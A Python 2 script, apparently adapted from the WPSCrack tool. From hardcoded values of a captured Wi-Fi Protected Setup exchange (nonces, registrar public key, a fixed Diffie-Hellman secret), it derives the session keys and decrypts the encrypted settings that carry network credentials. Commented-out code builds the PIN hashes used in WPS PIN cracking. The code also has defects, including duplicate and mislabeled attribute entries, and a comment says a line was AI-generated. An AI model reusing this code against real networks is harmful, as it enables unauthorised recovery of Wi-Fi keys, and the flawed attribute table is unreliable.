import time, threading, hmac, hashlib, sys, optparse, random, socket, fcntl, random
from struct import pack, unpack
from Crypto.Cipher import AES
import signal
import binascii
import hashlib
import os

class WPSCrack:
	verbose = None
	client_mac = None
	bssid = None
	ssid = None
	secret_number = None
	timeout_time = None
	pin = None

	# 1536-bit MODP Group from RFC 3526
	prime_str = 'FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1'\
	            '29024E088A67CC74020BBEA63B139B22514A08798E3404DD'\
	            'EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245'\
	            'E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED'\
	            'EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D'\
	            'C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F'\
	            '83655D23DCA3AD961C62F356208552BB9ED529077096966D'\
	            '670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF'
	prime_int = int(prime_str, 16)

	rcved_auth_response = False
	rcved_asso_response = False
	rcved_eap_request_identity = False
	rcved_m1 = False
	rcved_m3 = False
	rcved_m5 = False


	m4_sent = False
	got_fist_half = False
	done = False

	request_EAP_id = 0
	last_msg_buffer = ''
	rcved = threading.Event()
	ENonce = "K%\272e\253\335\261\273O\251\2326!7\345A"
	RNonce = "\264\200\377\234\216C\271\t\177;T\331\"\036\024\351"
	Encrypted_Settings = "! \037\260@\244`zqz\270\2325\020\306\255\205\270\364q\271ijbj\031\232U\340\353_\\\\\367Z%,\001\036\241Yy[\325\323\240\202\354\031Z\340\341]p\b\254\351\260\275\344\371[\300\027\315\330v\227\016\376\030+\364\366!\345\305\030\311\327\324+x\r\fc&\t\361\260\317\260#\035\317*j\357=\020\303\225\265\034\263K\314\301\004?\367\313"

	PK_E = ''

	PK_R = "\034O\224]\265\250\317>\003\224\272\205\022\002\264+\270xg\036o\177\244;\351Dz\233\205\273\004|\264b\323x\266#bg\377\003,m\267B\002\273\267\313\314-7\vS^\224\253\026\241\356\330\021\354\031yd2\203G\303\v\313v\250[/\243\t\331P!\275\030wm\315k\333S\034(\207\rH\202K\323\302\260N6\250\017\337\177\262\363C;1\006*\333\213\234\374\270\017\003n\215aV\255\314\241:\034\216Ur:\351}\254\241 \204G\305k\356\252\021\032~\265\316\257\332\241\373\335\351T\377\024%\351\342\315\327\271\230\365DO\362\314\257\"X\351D\205\270,\307\366Qc\262>\331\213\037\002Q@\267\305"

	EnrolleeMAC = "\x7c\x78\xb2\xe9\x73\x25"

	AuthKey = ''
	KeyWrapKey = ''
	EMSK = ''

	PSK1 = ''
	PSK2 = ''
	E_S1 = ''
	E_S2 = ''
	EHash1 = ''
	EHash2 = ''
	R_S1 = ''
	R_S2 = ''
	RHash1 = ''
	RHash1 = ''
	has_auth_failed = False
	has_timeout = False
	has_retry = False

	wps_attributes = {
	        0xFF00 : 'Vendor',
	        0xFF01 : 'Vendor Type',
	        0xFF02 : 'Opcode',
	        0xFF03 : 'Flags',
	        0x104A : 'Version',
	        0x104A : 'Authentication Flags',
	        0x1022 : 'Message Type',
	        0x1047 : 'UUID E',
	        0x1020 : 'MAC',
	        0x101a : 'Enrollee Nonce',
	        0x1032 : 'Public Key',
	        0x1010 : 'Encryption Type Flags',
	        0x100d : 'Connection Type Flags',
	        0x1008 : 'Config Methods',
	        0x100d : 'Wifi Protected Setup State',
	        0x1021 : 'Manufacturer',
	        0x1023 : 'Model Name',
	        0x1024 : 'Model Number',
	        0x1042 : 'Serial Number',
	        0x1054 : 'Primary Device Type',
	        0x1011 : 'Device Name',
	        0x103c : 'RF Bands',
	        0x1002 : 'Association State',
	        0x1012 : 'Device pin',
	        0x1009 : 'Configuration Error',
	        0x102d : 'OS Version',
	        0x1044 : 'Wifi Protected Setup State',
	        0x1004 : 'Authentication Type',
	        0x1005 : 'Authenticator',
	        0x1048 : 'UUID R',
	        0x1039 : 'Registrar Nonce',
	        0x1014 : 'E Hash 1',
	        0x1015 : 'E Hash 2',
	        0x103D : 'R Hash 2',
	        0x103E : 'R Hash 2',
	        0x1018 : 'Encrypted Settings',
	        0x103F : 'R-S1',
	        0x101e : 'Key Wrap Algorithm',
	        0x1016 : 'E-S1',
	        0x1017 : 'E-S2',
	        0x1003 : 'Auth Type',
	        0x100F : 'Encryption Type',
	        0x1003 : 'Auth Type',
	        0x1027 : 'Network Key',
	        0x1028 : 'Network Key Index',
	        0x1045 : 'SSID'
	        }

	wps_message_types = {
	                  0x04 : 'M1',
	                  0x05 : 'M2',
	                  0x07 : 'M3',
	                  0x08 : 'M4',
	                  0x09 : 'M5',
	                  0x0a : 'M6',
	                  0x0b : 'M7',
	                  0x0c : 'M8',
	                  0x0f : 'WSC_DONE',
	                  0x0e : 'WSC_NACK'
	                  }
	def bignum_pack(self, n, l):
	    return ''.join([(chr((n >> ((l - i - 1) * 8)) % 256)) for i in xrange(l)])

	def bignum_unpack(self, byte):
	    return sum([ord(b) << (8 * i) for i, b in enumerate(byte[::-1])])

	def kdf(self, key, personalization_string, el):
	    x = ''
	    for i in range (1, (sum(el) + 32 - 1) / 32): # slow
	        s = pack('!I', i) + personalization_string + pack('!I', sum(el))
	        x += hmac.new(key, s, hashlib.sha256).digest()
	        
	    r = []
	    c = 0
	    for e in el:
	        r.append(x[c:c + (e / 8)])
	        c += e / 8
	    return r

	def gen_keys(self):
	    # M1_secret = int(binascii.hexlify(os.urandom(32)), base=16) # Algorithm from https://github.com/amiralis/pyDH/blob/master/pyDH/pyDH.py
	    M1_secret = 113616539643067279644591316714209631367732066497132253224833117508269928848924L
	    print("[+] M1_secret in decimal", M1_secret)
	    M1_secret_hex = self.bignum_pack(M1_secret, 32)
	    print("[+] M1_secret hex")
	    print(''.join(['\\x'+c.encode('hex') for c in M1_secret_hex]))
	    # pubkey_enrollee = self.bignum_unpack(self.PK_E)
	    pubkey_enrollee = pow(2, M1_secret, self.prime_int)
	    # print("pubkey_enrollee", pubkey_enrollee)
	    self.PK_E = self.bignum_pack(pubkey_enrollee, 192)
	    print("[+] pubkey_enrollee in hex")
	    print(''.join(['\\x'+c.encode('hex') for c in self.PK_E])) # After bignum_pack, we can use this to dump 192 bytes public key. It's correct. ignore the red stuff. This line is generated by AI.
	    pubkey_registrar = self.bignum_unpack(self.PK_R)
	    # print("pubkey_registrar", pubkey_registrar)
	    shared_key = self.bignum_pack(pow(pubkey_registrar, M1_secret, self.prime_int), 192)
	    # print("[+] shared_key", shared_key)
	    # self.PK_R = self.bignum_pack(pubkey_registrar, 192)        
	    # self.RNonce = os.urandom(16)
	    DHKey = hashlib.sha256(shared_key).digest()
	    print("[+] DHKey", DHKey)
	    KDK = hmac.new(DHKey, (self.ENonce + self.EnrolleeMAC + self.RNonce), hashlib.sha256).digest()
	    self.AuthKey, self.KeyWrapKey, self.EMSK = self.kdf(KDK, 'Wi-Fi Easy and Secure Key Derivation', [256, 128, 256])
	    print("[+] KeyWrapKey", self.KeyWrapKey)
	    self.decrypt('\00' * 16, self.Encrypted_Settings)
	    # self.R_S1 = '\00' * 16 #random enough
	    # self.R_S2 = '\00' * 16        

	    # self.PSK1 = hmac.new(self.AuthKey, self.pin[0:4], hashlib.sha256).digest()[:16]
	    # self.PSK2 = hmac.new(self.AuthKey, self.pin[4:8], hashlib.sha256).digest()[:16]       
	    # self.RHash1 = hmac.new(self.AuthKey, self.R_S1 + self.PSK1 + self.PK_E + self.PK_R, hashlib.sha256).digest()
	    # self.RHash2 = hmac.new(self.AuthKey, self.R_S2 + self.PSK2 + self.PK_E + self.PK_R, hashlib.sha256).digest()

	def decrypt(self, iv, ciphertext):
	    p = AES.new(self.KeyWrapKey, AES.MODE_CBC, iv).decrypt(ciphertext)
	    plaintext = p[:len(p) - ord(p[-1])] # remove padding
	    print(plaintext.encode('string-escape'))
	    # return self.disassemble_EAP_Expanded(plaintext)

def main():
    wps = WPSCrack()
    wps.gen_keys()

if __name__ == '__main__':
    main()
